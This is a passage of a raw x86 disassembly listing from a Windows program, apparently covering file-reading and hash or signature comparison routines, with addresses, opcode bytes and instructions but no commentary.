  401dc0:	8d 44 24 24          	lea    0x24(%esp),%eax
  401dc4:	56                   	push   %esi
  401dc5:	50                   	push   %eax
  401dc6:	b9 68 a7 41 00       	mov    $0x41a768,%ecx
  401dcb:	bf 80 00 00 00       	mov    $0x80,%edi
  401dd0:	8d 5c 24 18          	lea    0x18(%esp),%ebx
  401dd4:	c7 44 24 18 10 00 00 	movl   $0x10,0x18(%esp)
  401ddb:	00 
  401ddc:	e8 ef 32 00 00       	call   0x4050d0
  401de1:	83 c4 08             	add    $0x8,%esp
  401de4:	85 c0                	test   %eax,%eax
  401de6:	75 24                	jne    0x401e0c
  401de8:	8d 47 90             	lea    -0x70(%edi),%eax
  401deb:	33 c9                	xor    %ecx,%ecx
  401ded:	8d 49 00             	lea    0x0(%ecx),%ecx
  401df0:	8b 54 0c 14          	mov    0x14(%esp,%ecx,1),%edx
  401df4:	3b 54 0c 24          	cmp    0x24(%esp,%ecx,1),%edx
  401df8:	75 12                	jne    0x401e0c
  401dfa:	83 e8 04             	sub    $0x4,%eax
  401dfd:	83 c1 04             	add    $0x4,%ecx
  401e00:	83 f8 04             	cmp    $0x4,%eax
  401e03:	73 eb                	jae    0x401df0
  401e05:	c7 45 00 03 00 00 00 	movl   $0x3,0x0(%ebp)
  401e0c:	8b 4c 24 34          	mov    0x34(%esp),%ecx
  401e10:	5f                   	pop    %edi
  401e11:	5e                   	pop    %esi
  401e12:	5d                   	pop    %ebp
  401e13:	5b                   	pop    %ebx
  401e14:	33 cc                	xor    %esp,%ecx
  401e16:	b8 01 00 00 00       	mov    $0x1,%eax
  401e1b:	e8 2f 71 00 00       	call   0x408f4f
  401e20:	83 c4 28             	add    $0x28,%esp
  401e23:	c3                   	ret
  401e24:	cc                   	int3
  401e25:	cc                   	int3
  401e26:	cc                   	int3
  401e27:	cc                   	int3
  401e28:	cc                   	int3
  401e29:	cc                   	int3
  401e2a:	cc                   	int3
  401e2b:	cc                   	int3
  401e2c:	cc                   	int3
  401e2d:	cc                   	int3
  401e2e:	cc                   	int3
  401e2f:	cc                   	int3
  401e30:	83 ec 68             	sub    $0x68,%esp
  401e33:	a1 08 d6 41 00       	mov    0x41d608,%eax
  401e38:	33 c4                	xor    %esp,%eax
  401e3a:	89 44 24 64          	mov    %eax,0x64(%esp)
  401e3e:	b0 30                	mov    $0x30,%al
  401e40:	53                   	push   %ebx
  401e41:	55                   	push   %ebp
  401e42:	8b 6c 24 74          	mov    0x74(%esp),%ebp
  401e46:	88 44 24 0c          	mov    %al,0xc(%esp)
  401e4a:	88 44 24 0e          	mov    %al,0xe(%esp)
  401e4e:	b0 05                	mov    $0x5,%al
  401e50:	56                   	push   %esi
  401e51:	88 44 24 15          	mov    %al,0x15(%esp)
  401e55:	88 44 24 1b          	mov    %al,0x1b(%esp)
  401e59:	33 c0                	xor    %eax,%eax
  401e5b:	57                   	push   %edi
  401e5c:	8b f9                	mov    %ecx,%edi
  401e5e:	8b f2                	mov    %edx,%esi
  401e60:	0f b7 97 84 00 00 00 	movzwl 0x84(%edi),%edx
  401e67:	c6 44 24 15 2d       	movb   $0x2d,0x15(%esp)
  401e6c:	c6 44 24 17 09       	movb   $0x9,0x17(%esp)
  401e71:	c6 44 24 18 06       	movb   $0x6,0x18(%esp)
  401e76:	c6 44 24 1a 2b       	movb   $0x2b,0x1a(%esp)
  401e7b:	c6 44 24 1b 0e       	movb   $0xe,0x1b(%esp)
  401e80:	c6 44 24 1c 03       	movb   $0x3,0x1c(%esp)
  401e85:	c6 44 24 1d 02       	movb   $0x2,0x1d(%esp)
  401e8a:	c6 44 24 1e 1a       	movb   $0x1a,0x1e(%esp)
  401e8f:	88 44 24 20          	mov    %al,0x20(%esp)
  401e93:	c6 44 24 21 04       	movb   $0x4,0x21(%esp)
  401e98:	c6 44 24 22 20       	movb   $0x20,0x22(%esp)
  401e9d:	c7 44 24 10 2f 00 00 	movl   $0x2f,0x10(%esp)
  401ea4:	00 
  401ea5:	3b e8                	cmp    %eax,%ebp
  401ea7:	74 07                	je     0x401eb0
  401ea9:	c7 45 00 01 00 00 00 	movl   $0x1,0x0(%ebp)
  401eb0:	0f b7 c8             	movzwl %ax,%ecx
  401eb3:	8d 0c 49             	lea    (%ecx,%ecx,2),%ecx
  401eb6:	66 39 14 8d 44 a3 41 	cmp    %dx,0x41a344(,%ecx,4)
  401ebd:	00 
  401ebe:	74 0c                	je     0x401ecc
  401ec0:	40                   	inc    %eax
  401ec1:	66 83 f8 01          	cmp    $0x1,%ax
  401ec5:	72 e9                	jb     0x401eb0
  401ec7:	e9 a5 00 00 00       	jmp    0x401f71
  401ecc:	66 83 f8 01          	cmp    $0x1,%ax
  401ed0:	0f 83 9b 00 00 00    	jae    0x401f71
  401ed6:	0f b7 c0             	movzwl %ax,%eax
  401ed9:	8d 14 40             	lea    (%eax,%eax,2),%edx
  401edc:	8b 1c 95 48 a3 41 00 	mov    0x41a348(,%edx,4),%ebx
  401ee3:	56                   	push   %esi
  401ee4:	8d 74 24 58          	lea    0x58(%esp),%esi
  401ee8:	e8 f3 fd ff ff       	call   0x401ce0
  401eed:	83 c4 04             	add    $0x4,%esp
  401ef0:	85 c0                	test   %eax,%eax
  401ef2:	74 7d                	je     0x401f71
  401ef4:	81 c7 90 00 00 00    	add    $0x90,%edi
  401efa:	57                   	push   %edi
  401efb:	8b cb                	mov    %ebx,%ecx
  401efd:	8d 7c 24 14          	lea    0x14(%esp),%edi
  401f01:	8d 5c 24 28          	lea    0x28(%esp),%ebx
  401f05:	e8 06 2b 00 00       	call   0x404a10
  401f0a:	83 c4 04             	add    $0x4,%esp
  401f0d:	85 c0                	test   %eax,%eax
  401f0f:	75 60                	jne    0x401f71
  401f11:	8d 50 0f             	lea    0xf(%eax),%edx
  401f14:	8b c3                	mov    %ebx,%eax
  401f16:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  401f1a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  401f20:	8b 31                	mov    (%ecx),%esi
  401f22:	3b 30                	cmp    (%eax),%esi
  401f24:	75 4b                	jne    0x401f71
  401f26:	83 ea 04             	sub    $0x4,%edx
  401f29:	83 c0 04             	add    $0x4,%eax
  401f2c:	83 c1 04             	add    $0x4,%ecx
  401f2f:	83 fa 04             	cmp    $0x4,%edx
  401f32:	73 ec                	jae    0x401f20
  401f34:	8a 10                	mov    (%eax),%dl
  401f36:	3a 11                	cmp    (%ecx),%dl
  401f38:	75 37                	jne    0x401f71
  401f3a:	8a 50 01             	mov    0x1(%eax),%dl
  401f3d:	3a 51 01             	cmp    0x1(%ecx),%dl
  401f40:	75 2f                	jne    0x401f71
  401f42:	8a 40 02             	mov    0x2(%eax),%al
  401f45:	3a 41 02             	cmp    0x2(%ecx),%al
  401f48:	75 27                	jne    0x401f71
  401f4a:	b8 20 00 00 00       	mov    $0x20,%eax
  401f4f:	33 c9                	xor    %ecx,%ecx
  401f51:	8b 54 0c 54          	mov    0x54(%esp,%ecx,1),%edx
  401f55:	3b 54 0c 33          	cmp    0x33(%esp,%ecx,1),%edx
  401f59:	75 16                	jne    0x401f71
  401f5b:	83 e8 04             	sub    $0x4,%eax
  401f5e:	83 c1 04             	add    $0x4,%ecx
  401f61:	83 f8 04             	cmp    $0x4,%eax
  401f64:	73 eb                	jae    0x401f51
  401f66:	85 ed                	test   %ebp,%ebp
  401f68:	74 07                	je     0x401f71
  401f6a:	c7 45 00 03 00 00 00 	movl   $0x3,0x0(%ebp)
  401f71:	8b 4c 24 74          	mov    0x74(%esp),%ecx
  401f75:	5f                   	pop    %edi
  401f76:	5e                   	pop    %esi
  401f77:	5d                   	pop    %ebp
  401f78:	5b                   	pop    %ebx
  401f79:	33 cc                	xor    %esp,%ecx
  401f7b:	b8 01 00 00 00       	mov    $0x1,%eax
  401f80:	e8 ca 6f 00 00       	call   0x408f4f
  401f85:	83 c4 68             	add    $0x68,%esp
  401f88:	c3                   	ret
  401f89:	cc                   	int3
  401f8a:	cc                   	int3
  401f8b:	cc                   	int3
  401f8c:	cc                   	int3
  401f8d:	cc                   	int3
  401f8e:	cc                   	int3
  401f8f:	cc                   	int3
  401f90:	8b 44 24 08          	mov    0x8(%esp),%eax
  401f94:	57                   	push   %edi
  401f95:	8b 7c 24 10          	mov    0x10(%esp),%edi
  401f99:	50                   	push   %eax
  401f9a:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401f9e:	e8 0d 00 00 00       	call   0x401fb0
  401fa3:	83 c4 04             	add    $0x4,%esp
  401fa6:	5f                   	pop    %edi
  401fa7:	c3                   	ret
  401fa8:	cc                   	int3
  401fa9:	cc                   	int3
  401faa:	cc                   	int3
  401fab:	cc                   	int3
  401fac:	cc                   	int3
  401fad:	cc                   	int3
  401fae:	cc                   	int3
  401faf:	cc                   	int3
  401fb0:	56                   	push   %esi
  401fb1:	6a 00                	push   $0x0
  401fb3:	68 80 00 00 00       	push   $0x80
  401fb8:	6a 03                	push   $0x3
  401fba:	6a 00                	push   $0x0
  401fbc:	6a 01                	push   $0x1
  401fbe:	68 00 00 00 80       	push   $0x80000000
  401fc3:	50                   	push   %eax
  401fc4:	ff 15 44 80 41 00    	call   *0x418044
  401fca:	8b f0                	mov    %eax,%esi
  401fcc:	83 fe ff             	cmp    $0xffffffff,%esi
  401fcf:	75 27                	jne    0x401ff8
  401fd1:	85 ff                	test   %edi,%edi
  401fd3:	74 06                	je     0x401fdb
  401fd5:	c7 07 01 00 00 00    	movl   $0x1,(%edi)
  401fdb:	68 f4 a9 41 00       	push   $0x41a9f4
  401fe0:	68 19 08 00 00       	push   $0x819
  401fe5:	68 7c a8 41 00       	push   $0x41a87c
  401fea:	33 d2                	xor    %edx,%edx
  401fec:	e8 1f 42 00 00       	call   0x406210
  401ff1:	83 c4 0c             	add    $0xc,%esp
  401ff4:	33 c0                	xor    %eax,%eax
  401ff6:	5e                   	pop    %esi
  401ff7:	c3                   	ret
  401ff8:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  401ffc:	51                   	push   %ecx
  401ffd:	8b d7                	mov    %edi,%edx
  401fff:	8b ce                	mov    %esi,%ecx
  402001:	e8 2a 00 00 00       	call   0x402030
  402006:	83 c4 04             	add    $0x4,%esp
  402009:	56                   	push   %esi
  40200a:	85 c0                	test   %eax,%eax
  40200c:	75 0a                	jne    0x402018
  40200e:	ff 15 90 81 41 00    	call   *0x418190
  402014:	33 c0                	xor    %eax,%eax
  402016:	5e                   	pop    %esi
  402017:	c3                   	ret
  402018:	ff 15 90 81 41 00    	call   *0x418190
  40201e:	b8 01 00 00 00       	mov    $0x1,%eax
  402023:	5e                   	pop    %esi
  402024:	c3                   	ret
  402025:	cc                   	int3
  402026:	cc                   	int3
  402027:	cc                   	int3
  402028:	cc                   	int3
  402029:	cc                   	int3
  40202a:	cc                   	int3
  40202b:	cc                   	int3
  40202c:	cc                   	int3
  40202d:	cc                   	int3
  40202e:	cc                   	int3
  40202f:	cc                   	int3
  402030:	55                   	push   %ebp
  402031:	8b ec                	mov    %esp,%ebp
  402033:	83 e4 f8             	and    $0xfffffff8,%esp
  402036:	81 ec 14 07 00 00    	sub    $0x714,%esp
  40203c:	a1 08 d6 41 00       	mov    0x41d608,%eax
  402041:	33 c4                	xor    %esp,%eax
  402043:	89 84 24 10 07 00 00 	mov    %eax,0x710(%esp)
  40204a:	8b 45 08             	mov    0x8(%ebp),%eax
  40204d:	53                   	push   %ebx
  40204e:	56                   	push   %esi
  40204f:	57                   	push   %edi
  402050:	33 ff                	xor    %edi,%edi
  402052:	68 94 02 00 00       	push   $0x294
  402057:	8b d9                	mov    %ecx,%ebx
  402059:	8d 8c 24 68 04 00 00 	lea    0x468(%esp),%ecx
  402060:	8b f2                	mov    %edx,%esi
  402062:	57                   	push   %edi
  402063:	51                   	push   %ecx
  402064:	89 44 24 34          	mov    %eax,0x34(%esp)
  402068:	89 74 24 30          	mov    %esi,0x30(%esp)
  40206c:	89 7c 24 18          	mov    %edi,0x18(%esp)
  402070:	89 7c 24 28          	mov    %edi,0x28(%esp)
  402074:	c7 44 24 38 03 00 00 	movl   $0x3,0x38(%esp)
  40207b:	00 
  40207c:	89 bc 24 6c 04 00 00 	mov    %edi,0x46c(%esp)
  402083:	e8 08 6f 00 00       	call   0x408f90
  402088:	33 c0                	xor    %eax,%eax
  40208a:	83 c4 0c             	add    $0xc,%esp
  40208d:	89 7c 24 14          	mov    %edi,0x14(%esp)
  402091:	89 44 24 38          	mov    %eax,0x38(%esp)
  402095:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  402099:	89 44 24 40          	mov    %eax,0x40(%esp)
  40209d:	89 44 24 44          	mov    %eax,0x44(%esp)
  4020a1:	89 44 24 48          	mov    %eax,0x48(%esp)
  4020a5:	89 44 24 4c          	mov    %eax,0x4c(%esp)
  4020a9:	89 44 24 50          	mov    %eax,0x50(%esp)
  4020ad:	89 44 24 54          	mov    %eax,0x54(%esp)
  4020b1:	89 44 24 58          	mov    %eax,0x58(%esp)
  4020b5:	89 44 24 5c          	mov    %eax,0x5c(%esp)
  4020b9:	3b f7                	cmp    %edi,%esi
  4020bb:	0f 84 b7 00 00 00    	je     0x402178
  4020c1:	8b 46 2c             	mov    0x2c(%esi),%eax
  4020c4:	c7 06 01 00 00 00    	movl   $0x1,(%esi)
  4020ca:	89 7e 28             	mov    %edi,0x28(%esi)
  4020cd:	3b c7                	cmp    %edi,%eax
  4020cf:	0f 84 98 00 00 00    	je     0x40216d
  4020d5:	8b 4e 30             	mov    0x30(%esi),%ecx
  4020d8:	3b cf                	cmp    %edi,%ecx
  4020da:	0f 84 8d 00 00 00    	je     0x40216d
  4020e0:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4020e4:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  4020e8:	53                   	push   %ebx
  4020e9:	e8 52 18 00 00       	call   0x403940
  4020ee:	83 c4 04             	add    $0x4,%esp
  4020f1:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4020f5:	85 c0                	test   %eax,%eax
  4020f7:	0f 84 fb 01 00 00    	je     0x4022f8
  4020fd:	8d 54 24 14          	lea    0x14(%esp),%edx
  402101:	52                   	push   %edx
  402102:	8d 9c 24 64 04 00 00 	lea    0x464(%esp),%ebx
  402109:	8b f8                	mov    %eax,%edi
  40210b:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  402112:	00 
  402113:	e8 88 ef ff ff       	call   0x4010a0
  402118:	83 c4 04             	add    $0x4,%esp
  40211b:	85 c0                	test   %eax,%eax
  40211d:	0f 84 d5 01 00 00    	je     0x4022f8
  402123:	83 7c 24 14 00       	cmpl   $0x0,0x14(%esp)
  402128:	0f 84 97 00 00 00    	je     0x4021c5
  40212e:	8d 44 24 10          	lea    0x10(%esp),%eax
  402132:	50                   	push   %eax
  402133:	8b cb                	mov    %ebx,%ecx
  402135:	8b d7                	mov    %edi,%edx
  402137:	e8 f4 fc ff ff       	call   0x401e30
  40213c:	83 c4 04             	add    $0x4,%esp
  40213f:	85 c0                	test   %eax,%eax
  402141:	0f 84 b1 01 00 00    	je     0x4022f8
  402147:	83 7c 24 10 00       	cmpl   $0x0,0x10(%esp)
  40214c:	0f 84 9b 02 00 00    	je     0x4023ed
  402152:	c7 44 24 3c 04 00 00 	movl   $0x4,0x3c(%esp)
  402159:	00 
  40215a:	85 f6                	test   %esi,%esi
  40215c:	0f 84 8b 02 00 00    	je     0x4023ed
  402162:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  402168:	e9 80 02 00 00       	jmp    0x4023ed
  40216d:	c7 06 03 00 00 00    	movl   $0x3,(%esi)
  402173:	e9 80 01 00 00       	jmp    0x4022f8
  402178:	68 00 20 00 00       	push   $0x2000
  40217d:	c7 44 24 1c 00 20 00 	movl   $0x2000,0x1c(%esp)
  402184:	00 
  402185:	e8 67 8a 00 00       	call   0x40abf1
  40218a:	8b f8                	mov    %eax,%edi
  40218c:	83 c4 04             	add    $0x4,%esp
  40218f:	85 ff                	test   %edi,%edi
  402191:	75 08                	jne    0x40219b
  402193:	6a 08                	push   $0x8
  402195:	ff 15 a8 80 41 00    	call   *0x4180a8
  40219b:	89 7c 24 1c          	mov    %edi,0x1c(%esp)
  40219f:	85 ff                	test   %edi,%edi
  4021a1:	0f 85 41 ff ff ff    	jne    0x4020e8
  4021a7:	68 dc a8 41 00       	push   $0x41a8dc
  4021ac:	68 6e 08 00 00       	push   $0x86e
  4021b1:	68 7c a8 41 00       	push   $0x41a87c
  4021b6:	33 d2                	xor    %edx,%edx
  4021b8:	e8 53 40 00 00       	call   0x406210
  4021bd:	83 c4 0c             	add    $0xc,%esp
  4021c0:	e9 37 01 00 00       	jmp    0x4022fc
  4021c5:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4021c9:	51                   	push   %ecx
  4021ca:	8d 7c 24 18          	lea    0x18(%esp),%edi
  4021ce:	8d 4c 24 64          	lea    0x64(%esp),%ecx
  4021d2:	e8 29 ee ff ff       	call   0x401000
  4021d7:	83 c4 04             	add    $0x4,%esp
  4021da:	85 c0                	test   %eax,%eax
  4021dc:	0f 84 16 01 00 00    	je     0x4022f8
  4021e2:	83 7c 24 14 00       	cmpl   $0x0,0x14(%esp)
  4021e7:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4021eb:	75 3b                	jne    0x402228
  4021ed:	8d 54 24 10          	lea    0x10(%esp),%edx
  4021f1:	52                   	push   %edx
  4021f2:	e8 89 fb ff ff       	call   0x401d80
  4021f7:	83 c4 04             	add    $0x4,%esp
  4021fa:	85 c0                	test   %eax,%eax
  4021fc:	0f 84 f6 00 00 00    	je     0x4022f8
  402202:	83 7c 24 10 00       	cmpl   $0x0,0x10(%esp)
  402207:	0f 84 e0 01 00 00    	je     0x4023ed
  40220d:	c7 44 24 3c 03 00 00 	movl   $0x3,0x3c(%esp)
  402214:	00 
  402215:	85 f6                	test   %esi,%esi
  402217:	0f 84 d0 01 00 00    	je     0x4023ed
  40221d:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  402223:	e9 c5 01 00 00       	jmp    0x4023ed
  402228:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  40222c:	8d 44 24 18          	lea    0x18(%esp),%eax
  402230:	50                   	push   %eax
  402231:	8b 44 24 64          	mov    0x64(%esp),%eax
  402235:	53                   	push   %ebx
  402236:	51                   	push   %ecx
  402237:	e8 54 19 00 00       	call   0x403b90
  40223c:	83 c4 0c             	add    $0xc,%esp
  40223f:	85 c0                	test   %eax,%eax
  402241:	75 22                	jne    0x402265
  402243:	8b 44 24 18          	mov    0x18(%esp),%eax
  402247:	85 c0                	test   %eax,%eax
  402249:	0f 86 a9 00 00 00    	jbe    0x4022f8
  40224f:	85 f6                	test   %esi,%esi
  402251:	0f 84 a5 00 00 00    	je     0x4022fc
  402257:	c7 06 02 00 00 00    	movl   $0x2,(%esi)
  40225d:	89 46 28             	mov    %eax,0x28(%esi)
  402260:	e9 93 00 00 00       	jmp    0x4022f8
  402265:	8b 7c 24 18          	mov    0x18(%esp),%edi
  402269:	8d 54 24 18          	lea    0x18(%esp),%edx
  40226d:	52                   	push   %edx
  40226e:	8d 44 24 24          	lea    0x24(%esp),%eax
  402272:	50                   	push   %eax
  402273:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  402277:	51                   	push   %ecx
  402278:	8d 54 24 40          	lea    0x40(%esp),%edx
  40227c:	52                   	push   %edx
  40227d:	57                   	push   %edi
  40227e:	8d 4c 24 4c          	lea    0x4c(%esp),%ecx
  402282:	8b c3                	mov    %ebx,%eax
  402284:	c7 44 24 24 01 00 00 	movl   $0x1,0x24(%esp)
  40228b:	00 
  40228c:	e8 ff ee ff ff       	call   0x401190
  402291:	83 c4 14             	add    $0x14,%esp
  402294:	85 c0                	test   %eax,%eax
  402296:	0f 84 51 01 00 00    	je     0x4023ed
  40229c:	85 f6                	test   %esi,%esi
  40229e:	74 09                	je     0x4022a9
  4022a0:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  4022a6:	89 7e 28             	mov    %edi,0x28(%esi)
  4022a9:	83 7c 24 28 00       	cmpl   $0x0,0x28(%esp)
  4022ae:	0f 84 47 01 00 00    	je     0x4023fb
  4022b4:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4022b8:	e8 e3 1f 00 00       	call   0x4042a0
  4022bd:	85 c0                	test   %eax,%eax
  4022bf:	0f 84 28 01 00 00    	je     0x4023ed
  4022c5:	83 7c 24 3c 00       	cmpl   $0x0,0x3c(%esp)
  4022ca:	74 69                	je     0x402335
  4022cc:	c7 44 24 14 50 a4 41 	movl   $0x41a450,0x14(%esp)
  4022d3:	00 
  4022d4:	8b 44 24 18          	mov    0x18(%esp),%eax
  4022d8:	8b 54 24 20          	mov    0x20(%esp),%edx
  4022dc:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4022e0:	50                   	push   %eax
  4022e1:	8d 7c 24 24          	lea    0x24(%esp),%edi
  4022e5:	8d 9c 24 00 07 00 00 	lea    0x700(%esp),%ebx
  4022ec:	e8 3f f8 ff ff       	call   0x401b30
  4022f1:	83 c4 04             	add    $0x4,%esp
  4022f4:	85 c0                	test   %eax,%eax
  4022f6:	75 60                	jne    0x402358
  4022f8:	85 f6                	test   %esi,%esi
  4022fa:	75 11                	jne    0x40230d
  4022fc:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  402300:	85 c0                	test   %eax,%eax
  402302:	74 09                	je     0x40230d
  402304:	50                   	push   %eax
  402305:	e8 0a 88 00 00       	call   0x40ab14
  40230a:	83 c4 04             	add    $0x4,%esp
  40230d:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402311:	85 c0                	test   %eax,%eax
  402313:	74 09                	je     0x40231e
  402315:	50                   	push   %eax
  402316:	e8 f9 87 00 00       	call   0x40ab14
  40231b:	83 c4 04             	add    $0x4,%esp
  40231e:	33 c0                	xor    %eax,%eax
  402320:	5f                   	pop    %edi
  402321:	5e                   	pop    %esi
  402322:	5b                   	pop    %ebx
  402323:	8b 8c 24 10 07 00 00 	mov    0x710(%esp),%ecx
  40232a:	33 cc                	xor    %esp,%ecx
  40232c:	e8 1e 6c 00 00       	call   0x408f4f
  402331:	8b e5                	mov    %ebp,%esp
  402333:	5d                   	pop    %ebp
  402334:	c3                   	ret
  402335:	c7 44 24 14 58 a5 41 	movl   $0x41a558,0x14(%esp)
  40233c:	00 
  40233d:	e8 4e f6 ff ff       	call   0x401990
  402342:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  402346:	83 f8 03             	cmp    $0x3,%eax
  402349:	74 89                	je     0x4022d4
  40234b:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  402352:	00 
  402353:	e9 95 00 00 00       	jmp    0x4023ed
  402358:	83 7c 24 20 00       	cmpl   $0x0,0x20(%esp)
  40235d:	0f 84 8a 00 00 00    	je     0x4023ed
  402363:	8b 4c 24 34          	mov    0x34(%esp),%ecx
  402367:	8b 7c 24 30          	mov    0x30(%esp),%edi
  40236b:	51                   	push   %ecx
  40236c:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  402370:	8d 94 24 10 07 00 00 	lea    0x710(%esp),%edx
  402377:	52                   	push   %edx
  402378:	8d 5c 24 28          	lea    0x28(%esp),%ebx
  40237c:	c7 44 24 28 10 00 00 	movl   $0x10,0x28(%esp)
  402383:	00 
  402384:	e8 47 2d 00 00       	call   0x4050d0
  402389:	83 c4 08             	add    $0x8,%esp
  40238c:	85 c0                	test   %eax,%eax
  40238e:	75 5d                	jne    0x4023ed
  402390:	b8 10 00 00 00       	mov    $0x10,%eax
  402395:	33 c9                	xor    %ecx,%ecx
  402397:	eb 07                	jmp    0x4023a0
  402399:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4023a0:	8b 94 0c fc 06 00 00 	mov    0x6fc(%esp,%ecx,1),%edx
  4023a7:	3b 94 0c 0c 07 00 00 	cmp    0x70c(%esp,%ecx,1),%edx
  4023ae:	75 3d                	jne    0x4023ed
  4023b0:	83 e8 04             	sub    $0x4,%eax
  4023b3:	83 c1 04             	add    $0x4,%ecx
  4023b6:	83 f8 04             	cmp    $0x4,%eax
  4023b9:	73 e5                	jae    0x4023a0
  4023bb:	8d 74 24 58          	lea    0x58(%esp),%esi
  4023bf:	e8 8c f5 ff ff       	call   0x401950
  4023c4:	85 c0                	test   %eax,%eax
  4023c6:	74 0a                	je     0x4023d2
  4023c8:	c7 44 24 10 02 00 00 	movl   $0x2,0x10(%esp)
  4023cf:	00 
  4023d0:	eb 17                	jmp    0x4023e9
  4023d2:	b8 02 00 00 00       	mov    $0x2,%eax
  4023d7:	c7 44 24 10 03 00 00 	movl   $0x3,0x10(%esp)
  4023de:	00 
  4023df:	39 44 24 2c          	cmp    %eax,0x2c(%esp)
  4023e3:	75 04                	jne    0x4023e9
  4023e5:	89 44 24 10          	mov    %eax,0x10(%esp)
  4023e9:	8b 74 24 24          	mov    0x24(%esp),%esi
  4023ed:	8b 44 24 28          	mov    0x28(%esp),%eax
  4023f1:	85 c0                	test   %eax,%eax
  4023f3:	74 06                	je     0x4023fb
  4023f5:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4023f9:	89 08                	mov    %ecx,(%eax)
  4023fb:	85 f6                	test   %esi,%esi
  4023fd:	75 0f                	jne    0x40240e
  4023ff:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  402403:	52                   	push   %edx
  402404:	e8 0b 87 00 00       	call   0x40ab14
  402409:	83 c4 04             	add    $0x4,%esp
  40240c:	eb 15                	jmp    0x402423
  40240e:	8b 06                	mov    (%esi),%eax
  402410:	8b 7c 24 24          	mov    0x24(%esp),%edi
  402414:	b9 0a 00 00 00       	mov    $0xa,%ecx
  402419:	8d 74 24 38          	lea    0x38(%esp),%esi
  40241d:	89 44 24 38          	mov    %eax,0x38(%esp)
  402421:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402423:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  402427:	51                   	push   %ecx
  402428:	e8 e7 86 00 00       	call   0x40ab14
  40242d:	8b 8c 24 20 07 00 00 	mov    0x720(%esp),%ecx
  402434:	83 c4 04             	add    $0x4,%esp
  402437:	5f                   	pop    %edi
  402438:	5e                   	pop    %esi
  402439:	5b                   	pop    %ebx
  40243a:	33 cc                	xor    %esp,%ecx
  40243c:	b8 01 00 00 00       	mov    $0x1,%eax
  402441:	e8 09 6b 00 00       	call   0x408f4f
  402446:	8b e5                	mov    %ebp,%esp
  402448:	5d                   	pop    %ebp
  402449:	c3                   	ret
  40244a:	cc                   	int3
  40244b:	cc                   	int3
  40244c:	cc                   	int3
  40244d:	cc                   	int3
  40244e:	cc                   	int3
  40244f:	cc                   	int3
  402450:	56                   	push   %esi
  402451:	57                   	push   %edi
  402452:	8b fa                	mov    %edx,%edi
  402454:	33 c0                	xor    %eax,%eax
  402456:	be 00 10 00 00       	mov    $0x1000,%esi
  40245b:	2b f9                	sub    %ecx,%edi
  40245d:	8d 49 00             	lea    0x0(%ecx),%ecx
  402460:	8d 96 fe ef ff 7f    	lea    0x7fffeffe(%esi),%edx
  402466:	85 d2                	test   %edx,%edx
  402468:	74 24                	je     0x40248e
  40246a:	0f b7 14 0f          	movzwl (%edi,%ecx,1),%edx
  40246e:	66 85 d2             	test   %dx,%dx
  402471:	74 1b                	je     0x40248e
  402473:	66 89 11             	mov    %dx,(%ecx)
  402476:	83 c1 02             	add    $0x2,%ecx
  402479:	83 ee 01             	sub    $0x1,%esi
  40247c:	75 e2                	jne    0x402460
  40247e:	83 e9 02             	sub    $0x2,%ecx
  402481:	33 d2                	xor    %edx,%edx
  402483:	5f                   	pop    %edi
  402484:	b8 7a 00 07 80       	mov    $0x8007007a,%eax
  402489:	66 89 11             	mov    %dx,(%ecx)
  40248c:	5e                   	pop    %esi
  40248d:	c3                   	ret
  40248e:	85 f6                	test   %esi,%esi
  402490:	75 08                	jne    0x40249a
  402492:	83 e9 02             	sub    $0x2,%ecx
  402495:	b8 7a 00 07 80       	mov    $0x8007007a,%eax
  40249a:	33 d2                	xor    %edx,%edx
  40249c:	5f                   	pop    %edi
  40249d:	66 89 11             	mov    %dx,(%ecx)
  4024a0:	5e                   	pop    %esi
  4024a1:	c3                   	ret
  4024a2:	cc                   	int3
  4024a3:	cc                   	int3
  4024a4:	cc                   	int3
  4024a5:	cc                   	int3
  4024a6:	cc                   	int3
  4024a7:	cc                   	int3
  4024a8:	cc                   	int3
  4024a9:	cc                   	int3
  4024aa:	cc                   	int3
  4024ab:	cc                   	int3
  4024ac:	cc                   	int3
  4024ad:	cc                   	int3
  4024ae:	cc                   	int3
  4024af:	cc                   	int3
  4024b0:	55                   	push   %ebp
  4024b1:	8b 6c 24 08          	mov    0x8(%esp),%ebp
  4024b5:	56                   	push   %esi
  4024b6:	57                   	push   %edi
  4024b7:	8b f8                	mov    %eax,%edi
  4024b9:	8b f7                	mov    %edi,%esi
  4024bb:	d1 ee                	shr    $1,%esi
  4024bd:	b8 00 00 00 00       	mov    $0x0,%eax
  4024c2:	74 08                	je     0x4024cc
  4024c4:	81 fe ff ff ff 7f    	cmp    $0x7fffffff,%esi
  4024ca:	76 05                	jbe    0x4024d1
  4024cc:	b8 57 00 07 80       	mov    $0x80070057,%eax
  4024d1:	85 c0                	test   %eax,%eax
  4024d3:	7c 63                	jl     0x402538
  4024d5:	33 c0                	xor    %eax,%eax
  4024d7:	8b ce                	mov    %esi,%ecx
  4024d9:	85 f6                	test   %esi,%esi
  4024db:	75 15                	jne    0x4024f2
  4024dd:	66 39 02             	cmp    %ax,(%edx)
  4024e0:	74 49                	je     0x40252b
